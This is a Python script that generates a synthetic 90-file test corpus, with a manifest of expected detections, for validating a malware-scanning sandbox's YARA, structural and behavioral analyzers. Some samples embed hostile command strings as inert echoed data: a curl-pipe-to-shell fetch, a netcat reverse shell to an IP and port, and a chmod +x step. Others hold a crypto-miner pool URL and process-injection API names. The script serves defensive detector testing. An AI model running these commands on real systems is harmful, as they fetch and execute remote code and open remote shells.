"""Generate the controlled 90-file synthetic M6 validation corpus + manifest.

Samples are inert, synthetic and derived from the CURRENT implementation:
- YARA triggers use only existing rules (backend/rules/yara).
- Structural triggers use the existing StructuralAnalyzer markers.
- Dynamic triggers use the existing M5 behavioral patterns.
No real malware, no new rules, no network side effects (sandbox network is DENY).
"""

import io
import json
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent
CORPUS = ROOT / "corpus"
CORPUS.mkdir(parents=True, exist_ok=True)

OLE = bytes.fromhex("D0CF11E0A1B11AE1")
MARK_YARA = b"SANDBOX_M4_YARA_TEST_MARKER"
MARK_STATIC = b"DOCSEC_M4_MALWARE_TEST_MARKER"
XMRIG = b"stratum+tcp://pool.example.invalid:3333"
INJECT = b"OpenProcess VirtualAllocEx WriteProcessMemory CreateRemoteThread"
PDF_JS_ACTION = [b"/JavaScript", b"/OpenAction"]


def pdf(markers=(), extra=b"", idx=0):
    body = [b"%PDF-1.4\n1 0 obj\n"]
    for m in markers:
        body.append(m + b"\n")
    body.append(b"<< /Type /Catalog >>\nendobj\n")
    body.append(f"%%m6-{idx:02d} benign padding ".encode() * 4)
    body.append(extra)
    body.append(b"\n%%EOF\n")
    return b"".join(body)


def make_zip(entries, idx=0, compression=zipfile.ZIP_DEFLATED, pad=True):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression) as zf:
        for name, data in entries.items():
            zf.writestr(name, data)
        if pad:
            zf.writestr(f"m6pad_{idx:02d}.txt", f"pad {idx}".encode())
    return buf.getvalue()


def nested_zip(depth, idx, leaf=b"leaf", compression=zipfile.ZIP_DEFLATED):
    inner = leaf
    for d in range(depth):
        inner = make_zip({f"level_{depth - d}.bin": inner}, idx=idx, compression=compression, pad=False)
    return inner


def ooxml_docx(idx, document=b"benign docx"):
    return make_zip(
        {
            "[Content_Types].xml": b'<?xml version="1.0"?><Types/>',
            "word/document.xml": document + f" {idx}".encode(),
        },
        idx=idx,
    )


SPEC = []


def add(filename, content_fn, category, expected, analyzers, rules, findings, notes,
        invalid=False, invalid_reason=None):
    SPEC.append(
        {
            "filename": filename,
            "content_fn": content_fn,
            "category": category,
            "expected_detection": expected,
            "expected_analyzers": analyzers,
            "expected_rules": rules,
            "expected_findings": findings,
            "notes": notes,
            "invalid_expectation": invalid,
            "invalid_reason": invalid_reason,
        }
    )


# ---------------- BENIGN (30) ----------------
for i in range(6):
    add(f"b_{i+1:02d}.txt", lambda i=i: f"Benign text sample {i:02d}. Plain words, nothing suspicious here.".encode(),
        "benign", False, [], [], [], "plain text")
for i in range(4):
    add(f"b_{i+7:02d}.json", lambda i=i: json.dumps({"id": i, "name": "bench", "items": [1, 2, 3]}).encode(),
        "benign", False, [], [], [], "harmless JSON")
for i in range(4):
    add(f"b_{i+11:02d}.csv", lambda i=i: f"id,label\n{i},ordinary\n{i+1},values\n".encode(),
        "benign", False, [], [], [], "harmless CSV")
for i in range(3):
    add(f"b_{i+15:02d}.html", lambda i=i: f"<html><body><h1>Page {i}</h1><p>ordinary content</p></body></html>".encode(),
        "benign", False, [], [], [], "harmless HTML")
for i in range(3):
    add(f"b_{i+18:02d}.pdf", lambda i=i: pdf(idx=i), "benign", False, [], [], [], "benign PDF, no active markers")
for i in range(3):
    add(f"b_{i+21:02d}.zip", lambda i=i: make_zip({"readme.txt": f"benign archive {i}".encode()}, idx=i),
        "benign", False, [], [], [], "benign ZIP archive")
for i in range(2):
    add(f"b_{i+24:02d}.png", lambda i=i: bytes.fromhex("89504E470D0A1A0A") + b"\x00" * 80 + f"png{i}".encode(),
        "benign", False, [], [], [], "PNG magic + inert padding")
add("b_26.rtf", lambda: b"{\\rtf1\\ansi benign rtf note, ordinary text}", "benign", False, [], [], [], "harmless RTF")
for i in range(2):
    add(f"b_{i+27:02d}.docx", lambda i=i: ooxml_docx(i), "benign", False, [], [], [], "benign OOXML docx")
add("b_29.py", lambda: b"print('hello from benign python sample')\n",
    "benign", False, [], [], [], "python source that only prints; M5 executes, no behavioral findings")
add("b_30.sh", lambda: b"#!/bin/sh\necho hello benign script\nexit 0\n",
    "benign", False, [], [], [], "shell script that only prints; M5 executes, no behavioral findings; M2 heuristic embedded_shell (LOW) expected")

# ---------------- YARA (20) ----------------
for i in range(4):
    add(f"y_{i+1:02d}.txt", lambda i=i: MARK_YARA + f" variant {i}".encode() + b"\npadding\n",
        "yara", True, ["yara"], ["SANDBOX_M4_TEST_MARKER"], ["yara_match"], "project test marker rule")
for i in range(4):
    add(f"y_{i+5:02d}.pdf", lambda i=i: pdf(PDF_JS_ACTION, idx=i), "yara", True,
        ["yara", "structural_analysis"], ["SANDBOX_PDF_ACTIVE_CONTENT"], ["yara_match", "structural_pdf_active_content"],
        "PDF active-content YARA rule; also structural marker")
for i in range(3):
    add(f"y_{i+9:02d}.doc", lambda i=i: OLE + b" dde ddeauto " + f" {i}".encode(),
        "yara", True, ["yara", "structural_analysis"], ["Contains_DDE_Protocol"],
        ["yara_match", "structural_office_macro"], "upstream DDE rule; OLE magic also structural")
for i in range(3):
    add(f"y_{i+12:02d}.doc", lambda i=i: OLE + b"VBAProject" + f" {i}".encode(),
        "yara", True, ["yara", "structural_analysis"], ["Contains_VBA_macro_code"],
        ["yara_match", "structural_office_macro"], "upstream VBA-macro rule; OLE magic also structural")
for i in range(3):
    add(f"y_{i+15:02d}.txt", lambda i=i: XMRIG + f" {i}".encode() + b"\n",
        "yara", True, ["yara"], ["XMRIG_Miner"], ["yara_match"], "upstream XMRIG miner rule (inert text)")
for i in range(3):
    add(f"y_{i+18:02d}.txt", lambda i=i: INJECT + f" {i}".encode() + b"\n",
        "yara", True, ["yara"], ["inject_thread"], ["yara_match"], "upstream capabilities inject_thread rule (inert text)")

# ---------------- STRUCTURAL (20) ----------------
for i in range(2):
    add(f"s_{i+1:02d}.pdf", lambda i=i: pdf([b"/Launch"], idx=i), "structural", True,
        ["structural_analysis"], [], ["structural_pdf_active_content"], "PDF /Launch marker (no YARA JS+OpenAction)")
for i in range(2):
    add(f"s_{i+3:02d}.pdf", lambda i=i: pdf([b"/EmbeddedFile"], idx=i), "structural", True,
        ["structural_analysis"], [], ["structural_pdf_active_content"], "PDF /EmbeddedFile marker")
for i in range(2):
    add(f"s_{i+5:02d}.zip", lambda i=i: make_zip({"doc.bin": f"VBAProject marker {i}".encode()}, idx=i, compression=zipfile.ZIP_STORED),
        "structural", True, ["structural_analysis"], [], ["structural_office_macro"],
        "stored VBAProject marker in zip (YARA VBA needs vbaProject.bin)")
for i in range(2):
    add(f"s_{i+7:02d}.doc", lambda i=i: OLE + b"padding" + f"{i}".encode(), "structural", True,
        ["structural_analysis"], [], ["structural_office_macro"], "OLE magic only (no DDE/VBA strings)")
for i in range(3):
    add(f"s_{i+9:02d}.zip", lambda i=i: nested_zip(2, i), "structural", True,
        ["structural_analysis"], [], ["structural_nested_archive"], "nested zip depth 2 (INFO finding + objects)")
for i in range(2):
    add(f"s_{i+12:02d}.bin", lambda i=i: b"PK\x03\x04" + b"\x00" * 120 + f"not a zip {i}".encode(), "structural", True,
        ["structural_analysis"], [], ["structural_malformed_archive"], "malformed archive (PK magic + garbage)")
for i in range(2):
    add(f"s_{i+14:02d}.zip", lambda i=i: make_zip({"zeros.bin": b"\x00" * 1048576}, idx=i), "structural", True,
        ["structural_analysis"], [], ["structural_archive_limit"],
        "high compression ratio (>200x). HIGH finding triggers M5 suspicion execution (fails safely, no behavioral findings)")
for i in range(2):
    add(f"s_{i+16:02d}.zip", lambda i=i: make_zip({f"entry_{j}.txt": f"data {j}".encode() for j in range(15)}, idx=i),
        "structural", False, ["structural_analysis"], [], [],
        "multi-entry archive: no detection finding, entries listed in payload objects")
for i in range(2):
    add(f"s_{i+18:02d}.zip", lambda i=i: nested_zip(6, i), "structural", True,
        ["structural_analysis"], [], ["structural_nested_archive"],
        "nesting: 6 nested zips = depth 5 in engine terms (top-level=0) -> nested finding only; no limit breach",
        invalid=True, invalid_reason="original expectation (limit at depth 6) mis-derived: top-level zip is depth 0, so 6 zips reach depth 5, never exceeding max_archive_depth=5")
add("s_20.zip", lambda: make_zip({"word/document.xml": b"VBAProject mention only"}, idx=20, compression=zipfile.ZIP_STORED),
    "structural", True, ["structural_analysis"], [], ["structural_office_macro"],
    "stored VBAProject mention (no vbaProject.bin -> no YARA)")

# ---------------- DYNAMIC (10) ----------------
add("d_01.sh", lambda: b"#!/bin/sh\necho hello\nexit 0\n", "dynamic", False, [], [], [],
    "benign script executed; no behavioral findings (M2 embedded_shell LOW expected)")
add("d_02.sh", lambda: b"#!/bin/sh\nsh -c 'echo hi'\nexit 0\n", "dynamic", True, ["sandbox"], [],
    ["process_creation", "shell_execution"], "child shell spawn")
add("d_03.sh", lambda: b"#!/bin/sh\nsh -c \"echo curl http://example.invalid/p | sh\"\nexit 0\n", "dynamic", True, ["sandbox"], [],
    ["process_creation", "shell_execution", "suspicious_command"],
    "suspicious curl|sh command in child argv (inert echo). NOTE: strace truncates argv to 32 chars -> known engine FN, reported as limitation")
add("d_04.sh", lambda: b"#!/bin/sh\nsh -c 'echo nc -e /bin/sh 1.2.3.4 4444'\nexit 0\n", "dynamic", True,
    ["sandbox", "static_analysis"], [], ["process_creation", "shell_execution", "suspicious_command", "static_reverse_shell", "static_ipv4_literal"],
    "netcat pattern in argv (dynamic) + reverse-shell/IP bytes in content (static)")
add("d_05.sh", lambda: b"#!/bin/sh\necho data > /tmp/m6_d5.txt\nls -la /tmp\nexit 0\n", "dynamic", True, ["sandbox"], [],
    ["file_creation"], "file creation observed in sandbox tmpfs")
add("d_06.py", lambda: b"print('dynamic benign python')\n", "dynamic", False, [], [], [],
    "python executed; no behavioral findings")
add("d_07.py", lambda: b"#!/usr/local/bin/python3\nimport socket\ns=socket.socket()\ns.settimeout(2)\ntry:\n    s.connect(('8.8.8.8',53))\nexcept Exception:\n    pass\n",
    "dynamic", True, ["sandbox", "static_analysis"], [], ["network_attempt", "dns_request", "static_ipv4_literal"],
    "DNS attempt port 53 (blocked, DENY policy) + IPv4 literal (static)")
add("d_08.sh", lambda: b"#!/bin/sh\nsh -c 'pwd'\nexit 0\n", "dynamic", True, ["sandbox"], [],
    ["process_creation", "shell_execution"], "second child shell variant")
add("d_09.sh", lambda: b"#!/bin/sh\nsh -c 'sh -c \"echo y\"'\nexit 0\n", "dynamic", True, ["sandbox"], [],
    ["process_creation", "shell_execution"], "double child shell spawn (2x process_creation + shell_execution)")
add("d_10.sh", lambda: b"#!/bin/sh\nsh -c 'echo chmod +x /tmp/x'\nexit 0\n", "dynamic", True, ["sandbox"], [],
    ["process_creation", "shell_execution", "suspicious_command"], "chmod +x pattern in argv (inert echo)")

# ---------------- MIXED (10) ----------------
add("m_01.pdf", lambda: pdf(PDF_JS_ACTION, extra=MARK_YARA + b"\n", idx=1), "mixed", True,
    ["yara", "structural_analysis"], ["SANDBOX_PDF_ACTIVE_CONTENT", "SANDBOX_M4_TEST_MARKER"],
    ["yara_match", "structural_pdf_active_content"], "YARA + structural on same PDF")
add("m_02.sh", lambda: b"#!/bin/sh\n# " + MARK_STATIC + b"\necho hi\nexit 0\n", "mixed", True,
    ["static_analysis"], [], ["static_test_malware_marker"],
    "benign script + CRITICAL static marker; M5 executes, no behavioral findings")
add("m_03.sh", lambda: b"#!/bin/sh\n# " + MARK_YARA + b"\nsh -c \"echo curl http://x.invalid/p | sh\"\nexit 0\n", "mixed", True,
    ["yara", "sandbox"], ["SANDBOX_M4_TEST_MARKER"],
    ["yara_match", "process_creation", "shell_execution", "suspicious_command"],
    "YARA marker + suspicious child command. NOTE: suspicious_command missed by engine (strace 32-char argv truncation) -> known FN, reported as limitation")
add("m_04.docx", lambda: make_zip({"word/vbaProject.bin": b"inert macro container", "word/document.xml": XMRIG}, idx=4),
    "mixed", True, ["yara", "structural_analysis"], ["Contains_VBA_macro_code"],
    ["yara_match", "structural_office_macro"],
    "VBA zip: YARA VBA + structural office. XMRIG string sits inside a DEFLATED entry -> invisible to raw-byte YARA scan",
    invalid=True, invalid_reason="expected XMRIG_Miner rule: YARA scans raw bytes only (no zip decompression), the string is deflated inside the archive")
add("m_05.bin", lambda: b"PK\x03\x04" + b"\x00" * 60 + XMRIG + b"\n", "mixed", True,
    ["yara", "structural_analysis"], ["XMRIG_Miner"], ["yara_match", "structural_malformed_archive"],
    "malformed archive + miner string (YARA + structural malformed)")
add("m_06.zip", lambda: make_zip({"inner.zip": make_zip({"m.txt": MARK_YARA}, idx=6, compression=zipfile.ZIP_STORED, pad=False)},
                                 idx=6, compression=zipfile.ZIP_STORED),
    "mixed", True, ["yara", "structural_analysis"], ["SANDBOX_M4_TEST_MARKER"],
    ["yara_match", "structural_nested_archive"], "nested archive carrying the YARA marker (stored)")
add("m_07.doc", lambda: OLE + b" dde ddeauto VBAProject\n", "mixed", True,
    ["yara", "structural_analysis"], ["Contains_DDE_Protocol", "Contains_VBA_macro_code"],
    ["yara_match", "structural_office_macro"], "OLE with DDE + VBA: two YARA rules + structural office")
add("m_08.pdf", lambda: pdf(PDF_JS_ACTION, idx=8), "mixed", True,
    ["yara", "structural_analysis"], ["SANDBOX_PDF_ACTIVE_CONTENT"],
    ["yara_match", "structural_pdf_active_content"], "YARA + structural via two analyzers on same PDF")
add("m_09.py", lambda: b"#!/usr/local/bin/python3\n# " + MARK_YARA + b"\nimport socket\ns=socket.socket()\ns.settimeout(2)\ntry:\n    s.connect(('8.8.8.8',53))\nexcept Exception:\n    pass\n",
    "mixed", True, ["yara", "sandbox", "static_analysis"], ["SANDBOX_M4_TEST_MARKER"],
    ["yara_match", "network_attempt", "dns_request", "static_ipv4_literal"], "YARA marker + dynamic DNS attempt + static IP literal")
add("m_10.zip", lambda: make_zip({"word/vbaProject.bin": b"inert", "word/document.xml": XMRIG}, idx=10),
    "mixed", True, ["yara", "structural_analysis"], ["Contains_VBA_macro_code"],
    ["yara_match", "structural_office_macro"],
    "VBA zip: YARA VBA + structural office. XMRIG string deflated inside archive -> invisible to raw-byte YARA",
    invalid=True, invalid_reason="expected XMRIG_Miner rule: YARA scans raw bytes only (no zip decompression), the string is deflated inside the archive")


def main():
    assert len(SPEC) == 90, len(SPEC)
    counts = {}
    manifest = []
    for entry in SPEC:
        content = entry.pop("content_fn")()
        (CORPUS / entry["filename"]).write_bytes(content)
        counts[entry["category"]] = counts.get(entry["category"], 0) + 1
        manifest.append(entry)
    (ROOT / "corpus_manifest.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    print("corpus generated:", counts, "total", len(manifest))


if __name__ == "__main__":
    main()
